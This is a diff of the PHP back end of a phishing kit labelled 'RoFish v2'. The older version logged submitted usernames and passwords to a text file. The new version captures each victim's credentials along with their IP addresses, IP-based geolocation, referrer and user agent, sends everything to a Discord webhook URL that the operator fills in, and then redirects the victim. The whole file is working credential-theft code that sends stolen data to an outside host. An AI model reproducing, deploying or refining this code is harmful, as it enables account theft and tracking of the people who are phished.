@@ -1,30 +1,111 @@
 <?php
-$nameErr = $error_css = $errortext = $error3 = $error4 = $error1 = $error2 = "";
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  if (empty($_POST["username"]) && empty($_POST["password"])) {
-    $nameErr = '<p style="position:relative;font-size:16px;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Username cannot be empty.<br>Password cannot be empy.';
-    $error1 = 'color: #F01B47';
-    $error2 = 'border-color: #F23C57';
-    $error3 = 'color: #F01B47';
-    $error4 = 'border-color: #F23C57';
-  }  elseif (empty($_POST["username"])) {
-    $nameErr = '<p style="position:relative;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Username cannot be empty</p>';
-    $error3 = 'color: #F01B47';
-    $error4 = 'border-color: #F23C57';
-  }  elseif (empty($_POST["password"])) {
-    $nameErr = '<p style="position:relative;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Password cannot be empty</p>';
-    $error1 = 'color: #F01B47';
-    $error2 = 'border-color: #F23C57';
-  }  else {
-    include 'database.php';
-    file_put_contents("database1.txt", "USERNAME: " . $_POST['username'] . " | PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
-    header('Location: error.html');
-  }
+function getLocalIP() {
+    return gethostbyname(gethostname());
 }
+
+function getPublicIP() {
+    return file_get_contents('https://api.ipify.org');
+}
+
+function getGeolocation($ip) {
+    $url = "https://ipapi.co/{$ip}/json/";
+    $response = file_get_contents($url);
+    return json_decode($response, true);
+}
+
+function logData($username, $password) {
+    $localIP = getLocalIP();
+    $publicIP = getPublicIP();
+    $rem_port = $_SERVER['REMOTE_PORT']; 
+    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
+    $date = date("Y/m/d G:i:s"); 
+    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';
+    
+    $locationInfo = getGeolocation($publicIP);
+    $latitude = $locationInfo['latitude'] ?? 'N/A';
+    $longitude = $locationInfo['longitude'] ?? 'N/A';
+
+    $logMessage = [
+        "username" => $username,
+        "password" => $password,
+        "local_ip" => $localIP,
+        "public_ip" => $publicIP,
+        "geolocation" => $locationInfo,
+        "latitude" => $latitude,
+        "longitude" => $longitude,
+        "referrer" => $referrer,
+        "port" => $rem_port,
+        "date" => $date,
+        "user_agent" => $user_agent
+    ];
+
+    sendToDiscordWebhook($logMessage);
+}
+
+function sendToDiscordWebhook($data) {
+    $webhookUrls = [
+        'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE',  // Replace with your actual Discord webhook URL
+        // Add more webhook URLs here if you want
+        // 'https://discord.com/api/webhooks/ANOTHER_WEBHOOK_URLl', // Example additional webhook
+    ];
+
+    $embed = [
+        "title" => "RoFish v2",
+        "color" => hexdec("dc3737"),
+        "fields" => [
+            ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
+            ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
+            ["name" => "🌐 Local IP", "value" => "`" . $data['local_ip'] . "`", "inline" => true],
+            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
+            ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
+            ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
+            ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
+            ["name" => "📡 Port", "value" => "`" . $data['port'] . "`", "inline" => true],
+            ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
+            ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],
+        ],
+        "image" => [
+            "url" => "https://i.imgur.com/g6rPxvE.png"
+        ],
+    ];
+
+    $json_data = json_encode(["embeds" => [$embed]]);
+
+    foreach ($webhookUrls as $webhookUrl) {
+        $ch = curl_init($webhookUrl);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'Content-Type: application/json',
+            'Content-Length: ' . strlen($json_data)
+        ]);
+        
+        $response = curl_exec($ch);
+        if ($response === false) {
+            error_log('Curl error: ' . curl_error($ch));
+        } else {
+            error_log('Response from Discord: ' . $response);
+        }
+        curl_close($ch);
+    }
+}
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = test_input($_POST["username"]);
+    $password = test_input($_POST["password"]);
+
+    if (!empty($username) && !empty($password)) {
+        logData($username, $password);
+        header('Location: index.html');
+        exit();
+    }
+}
+
 function test_input($data) {
-  $data = trim($data);
-  $data = stripslashes($data);
-  $data = htmlspecialchars($data);
-  return $data;
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
 }
 ?>
